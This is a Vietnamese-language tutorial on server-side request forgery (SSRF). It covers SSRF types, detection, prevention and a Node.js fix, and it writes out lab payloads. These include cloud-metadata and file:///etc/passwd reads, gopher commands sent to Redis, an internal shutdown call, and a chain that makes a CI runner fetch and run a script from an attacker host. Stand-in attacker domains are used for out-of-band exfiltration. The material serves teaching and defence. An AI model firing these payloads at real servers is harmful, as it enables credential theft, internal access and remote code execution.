# 1) SSRF là gì — tóm tắt

**Server-Side Request Forgery (SSRF)** là lỗi khi ứng dụng cho phép user kiểm soát URL/host mà server sẽ gọi. Kẻ tấn công lợi dụng để ép server thực hiện request tới dịch vụ nội bộ hoặc bên ngoài thay mặt server, dẫn tới lộ dữ liệu nội bộ, SSRF→SSRF chaining, SSRF→RCE hoặc SSRF→SSO token leak.


# 2) Phân loại SSRF & ví dụ cho mỗi loại

## A. Basic SSRF (Reflected / In-band)

**Mô tả:** server nhận URL từ user và fetch nội dung rồi trả về (hoặc hiển thị). Attacker chỉ cần cung cấp một URL để server truy vấn và hiển thị kết quả.

**Ví dụ vulnerable code (pseudo):**

```js
// Node.js pseudo: server fetches URL từ param `url` và trả nội dung
app.get('/fetch', async (req, res) => {
  const r = await fetch(req.query.url);
  const body = await r.text();
  res.send(body);
});
```

**Payload (lab):**

```
https://victim.example.com/fetch?url=http://example.com/attacker
```

Server sẽ request `http://example.com/attacker` — attacker có thể nhận request và thấy headers/source IP.

**Hậu quả:** xác thực token leaking nếu server đặt token header; dùng để fingerprint internal services.


## B. SSRF → Internal Service Access (localhost / internal IP)

**Mô tả:** server gọi tới địa chỉ nội bộ (127.0.0.1, 169.254.169.254, 10.x.x.x, 172.16.x.x, 192.168.x.x) để truy cập dịch vụ chỉ reachable từ máy đó.

**Ví dụ payloads:**

* Truy metadata AWS IMDS (lab/allowed only):
  `http://169.254.169.254/latest/meta-data/`
* Truy web admin nội bộ:
  `http://127.0.0.1:8080/admin`
* Truy Redis thông qua gopher (xem phần Protocol tricks):
  `gopher://127.0.0.1:6379/_%2a__` *(phức tạp hơn)*

**Hậu quả điển hình:** lộ metadata (credentials), nội dung admin, config, database consoles.


## C. Blind SSRF / OOB SSRF

**Mô tả:** server không trả nội dung fetch cho user — attacker không thấy kết quả trực tiếp. Thay vào đó attacker dùng một server mà họ kiểm soát và chờ server mục tiêu thực hiện các request (DNS/HTTP) tới attacker → exfiltration signal.

**Ví dụ workflow:**

* Attacker cung cấp URL: `http://attacker-server.com/collect?tag=1`
* Target server request URL → attacker server log thấy request → chứng thực SSRF "vulnerable".

**OOB payload (lab):**

```
https://victim/fetch?url=http://attacker-server.com/pwn
```

Hoặc dùng DNS exfil: `http://<random>.attacker-dns.com/` để nhìn thấy DNS lookup.

**Hậu quả:** phát hiện SSRF ngay cả khi response được che; exfiltrate nhỏ dữ liệu bằng cách encode vào path/params.


## D. Protocol-based SSRF (non-HTTP: file:/, gopher:, ftp:, smb:, dict:, ldap:)

**Mô tả:** một số HTTP client / URL handlers hỗ trợ nhiều scheme — attacker dùng scheme khác để lạm dụng dịch vụ khác (file, gopher → raw TCP, ldap → dùng để query LDAP).

**Ví dụ thực tế:**

* `file:///etc/passwd` — server đọc file cục bộ và trả nội dung (nếu client/handler hỗ trợ file scheme).
* `gopher://127.0.0.1:6379/_<raw-redis-protocol>` — dùng gopher để gửi raw bytes tới Redis (có thể chạy AUTH, GET/SET).
* `ftp://attacker/` — có thể trigger outbound FTP connections (logs).
* `ldap://127.0.0.1:389/...` — query LDAP nội bộ.

**Payload mẫu (lab):**

```
/fetch?url=file:///etc/passwd
/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value%0d%0a
```

*(gopher requires encoding raw protocol)*

**Hậu quả:** tương tác với dịch vụ nội bộ không phải HTTP; có thể thao tác database, cache, v.v.


## E. SSRF leading to Authentication Bypass / Privileged Actions

**Mô tả:** server có thể sử dụng internal endpoint với cookie/session/token riêng — attacker ép server gọi endpoint nội bộ để thực hiện hành động có quyền (ví dụ admin-only API) dùng session của server.

**Ví dụ:**

* Server có endpoint `http://localhost:9000/shutdown` chỉ accessible nội bộ. Attacker cung cấp URL tới đó — server thực thi lệnh shutdown.
* Nếu target gửi cookie/session nội bộ khi request, action xảy ra với quyền server.

**Payload:**

```
/fetch?url=http://127.0.0.1:9000/shutdown
```

**Hậu quả:** thao tác nội bộ, thay đổi config, truy vấn nội bộ.


## F. SSRF → Port Scanning / Internal Reconnaissance

**Mô tả:** attacker dùng SSRF để nối nhiều request/paths nhằm dò cổng hoặc dịch vụ nội bộ (ví dụ check 127.0.0.1:22, :80, :6379…).

**Phương pháp:** gửi nhiều URL khác nhau qua tham số fetch và infer cổng mở/đóng theo phản hồi/timeouts.

**Ví dụ payload sequence (lab):**

```
/fetch?url=http://127.0.0.1:22/
/fetch?url=http://127.0.0.1:80/
/fetch?url=http://127.0.0.1:6379/
```

**Hậu quả:** mapping internal network, tìm service vulnerable.


## G. SSRF → RCE (gián tiếp)

**Mô tả:** SSRF bản thân không chạy code, nhưng có thể kích hoạt RCE nếu server gọi một dịch vụ nội bộ có lỗ hổng (admin interface, deserialization endpoint, CI runner, template engines that fetch URLs and evaluate content).

**Ví dụ chuỗi:**

1. SSRF → gọi internal CI endpoint `/run?scriptUrl=http://attacker/payload`
2. CI tải script từ attacker và thực thi → RCE.

**Ví dụ payload (chuỗi attack, lab-only):**

```
/fetch?url=http://127.0.0.1:8080/run?scriptUrl=http://attacker/payload
```

**Hậu quả:** RCE, persistent compromise.


# 3) Kỹ thuật mô phỏng / payload thường dùng khi test (lab-only)

* In-band HTTP: `http://attacker.com/ping`
* Internal metadata (AWS): `http://169.254.169.254/latest/meta-data/`
* file scheme: `file:///etc/passwd`
* gopher to Redis (raw): `gopher://127.0.0.1:6379/_SET%20pwn%20hello%0D%0A`
* LDAP: `ldap://127.0.0.1:389/`
* OOB detection: `http://<random>.oob-server.com/` (monitor logs/DNS)

> Ghi chú: nhiều client libs block non-http schemes — phải biết client behavior.


# 4) Cách phát hiện / dò SSRF

* Tìm mọi chỗ server dùng URL do user cung cấp: image preview, fetch URL, webhook test, Open Redirect handlers, RSS/CSV import, URL-to-PDF, proxy endpoints, server-side template renderers that fetch remote include.
* Thử thay đổi host thành `http://127.0.0.1`, `http://169.254.169.254`, `http://localhost:PORT`, `file:///etc/passwd`, `gopher://...`, và quan sát response/timeouts.
* Dùng attacker-controlled OOB (HTTP/DNS) service để detect blind SSRF.
* Kiểm tra logs, outbound connections từ server (network logs), WAF alerts.


# 5) Phòng ngừa — best practices (tóm tắt, dễ nhớ)

1. **Allowlist hostnames / IPs**: chỉ cho server gọi tới danh sách host cho phép (domain-level allowlist).
2. **Disallow schemes**: chặn `file://`, `gopher://`, `ldap://`, `ftp://` trừ khi cần thiết; chỉ cho phép `http(s)`.
3. **Canonicalize & resolve hostnames**: trước khi request, parse URL, resolve DNS, kiểm tra IP trả về nằm trong private ranges; reject nếu là private/internal.
4. **Network egress control**: đặt firewall/egress rules để server không thể truy cập metadata IMDS hoặc internal services từ app tier.
5. **Metadata protection**: cloud providers offer IMDSv2 and IMDS protections — enforce IMDSv2, limit instance role permissions.
6. **Use a proxy/gateway**: tất cả outbound requests đi qua proxy kiểm duyệt & logging; proxy có thể enforce allowlist.
7. **Limit response size & timeouts**: tránh SSRF gây DoS.
8. **Authentication for internal services**: internal endpoints require mutual auth, not just IP-based.
9. **Validate URLs strictly**: parse and reject hostname that resolve to private IPs or suspicious ranges (IPv4/IPv6).
10. **Least privilege & segmentation**: dịch vụ app không nên có quyền truy cập vào quản trị hoặc metadata nếu không cần.


# 6) Ví dụ sửa code (Node.js) — vulnerable → safe (ngắn)

**Vulnerable:**

```js
app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  const r = await fetch(url); // dangerous
  res.send(await r.text());
});
```

**Safe (sketch):**

```js
const ALLOWED_DOMAINS = new Set(['example-cdn.com', 'youtube.com']);
app.get('/fetch', async (req, res) => {
  const url = new URL(req.query.url);

  // chỉ cho phép scheme http/https
  if (!['http:', 'https:'].includes(url.protocol)) return res.status(400).send('bad scheme');

  // canonicalize + resolve IP and block private ranges (pseudo)
  const ip = await dnsLookup(url.hostname);
  if (isPrivateIP(ip)) return res.status(400).send('no internal access');

  // domain allowlist
  if (!ALLOWED_DOMAINS.has(url.hostname)) return res.status(403).send('not allowed');

  // fetch via corporate proxy (which enforces further checks)
  const r = await fetch(url.href, { agent: proxyAgent });
  res.send(await r.text());
});
```


# 7) Checklist kiểm thử & remediation

* [ ] Liệt kê mọi endpoint nhận URL/host từ user.
* [ ] Thử payloads: localhost, 169.254.169.254, private IPs, file://, gopher://, attacker OOB.
* [ ] Kiểm tra blind SSRF bằng OOB DNS/HTTP.
* [ ] Kiểm tra port scan bằng chuỗi request khác nhau.
* [ ] Sau fix: verify bằng same payloads và confirm egress blocked / request rejected.
* [ ] Áp dụng egress firewall & metadata protections.